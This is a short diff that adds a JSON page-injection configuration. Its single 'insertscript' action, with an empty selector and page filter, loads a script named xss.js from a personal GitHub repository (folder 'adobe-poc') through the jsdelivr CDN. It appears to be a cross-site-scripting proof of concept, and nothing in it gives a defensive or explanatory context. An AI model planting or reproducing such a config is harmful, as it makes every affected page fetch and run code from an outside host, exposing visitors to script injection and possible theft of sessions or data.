@@ -1,0 +1,10 @@
+{
+  "data": [
+    {
+      "action": "insertscript",
+      "selector": "",
+      "page filter": "",
+      "all": "/\\cdn.jsdelivr.net/gh/rootd4ddy/test@main/adobe-poc/xss.js"
+    }
+  ]
+}
